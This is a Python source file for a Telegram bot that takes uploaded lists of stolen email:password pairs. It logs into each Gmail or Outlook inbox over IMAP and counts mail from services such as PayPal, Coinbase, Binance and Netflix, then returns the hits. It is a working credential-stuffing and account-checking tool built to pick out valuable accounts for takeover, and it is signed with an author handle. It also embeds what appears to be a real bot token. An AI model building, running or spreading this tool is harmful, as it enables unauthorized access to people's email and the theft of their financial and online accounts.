import logging
import imaplib
import email
import re
from email.header import decode_header
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext

# Telegram bot token
BOT_TOKEN = '7222570421:AAHcywX75xuNlAdkRkXMjP6xNZ06_jJlWNg'

# Configure logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Targets to check in emails
TARGETS = [
    "instagram.com", "netflix.com", "spotify.com", "paypal.com",
    "cash.app", "adobe.com", "facebook.com", "coinbase.com",
    "binance.com", "eezy.com", "digitalocean.com", "supercell.com", "twitter.com"
]

def start(update: Update, _: CallbackContext) -> None:
    update.message.reply_text('Hi! Send me your Hotmail - Gmail combo file (email:password) and I will check the inbox for specific targets. Author:@rundilundlegamera')

def help_command(update: Update, _: CallbackContext) -> None:
    update.message.reply_text('Send me a text file with email:password pairs, and I will check the inbox for specific targets.')

def check_email_inbox(email_user, email_pass, targets):
    if "hotmail.com" in email_user or "outlook.com" in email_user:
        imap_server = "imap-mail.outlook.com"
    elif "gmail.com" in email_user:
        imap_server = "imap.gmail.com"
    else:
        return None

    mail = imaplib.IMAP4_SSL(imap_server)
    try:
        mail.login(email_user, email_pass)
    except imaplib.IMAP4.error:
        return None

    try:
        mail.select("inbox")
    except imaplib.IMAP4.error:
        return None

    results = {}
    for target in targets:
        try:
            status, messages = mail.search(None, f'FROM "{target}"')
            if status == "OK":
                results[target] = len(messages[0].split())
            else:
                results[target] = 0
        except:
            results[target] = 0

    try:
        mail.logout()
    except imaplib.IMAP4.error:
        pass  # Ignore logout errors

    return results

def filter_combos(file_path):
    with open(file_path, 'r') as f:
        lines = f.readlines()
    
    valid_combos = []
    for line in lines:
        line = line.strip()
        if re.match(r'^[^@]+@[^@]+\.[^@]+:[^:]+$', line):
            valid_combos.append(line)
    
    return valid_combos

def handle_document(update: Update, _: CallbackContext) -> None:
    file = update.message.document.get_file()
    file_path = file.download()

    combos = filter_combos(file_path)
    combo_pairs = [combo.split(':') for combo in combos]

    results = []
    for email_user, email_pass in combo_pairs:
        data = check_email_inbox(email_user, email_pass, TARGETS)
        if data:
            results.append((email_user, email_pass, data))

    response_text = ""
    for email, password, data in results:
        response_text += f"{email}:{password}\n"
        response_text += "━━━━━━━━[𝗜𝗡𝗕𝗢𝗫 📥]━━━━━━━━\n"
        for target, count in data.items():
            response_text += f"{target}: {count} emails\n"
        response_text += "\nAuthor: @rundilundlegamera\n\n"

    output_file_path = 'result.txt'
    with open(output_file_path, 'w') as output_file:
        output_file.write(response_text)

    update.message.reply_document(document=open(output_file_path, 'rb'), filename='result.txt')

def main():
    updater = Updater(BOT_TOKEN, use_context=True)

    dispatcher = updater.dispatcher
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("help", help_command))
    dispatcher.add_handler(MessageHandler(Filters.document.mime_type("text/plain"), handle_document))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    print("Telegram Bot by @rundilundlegamera")
    main()
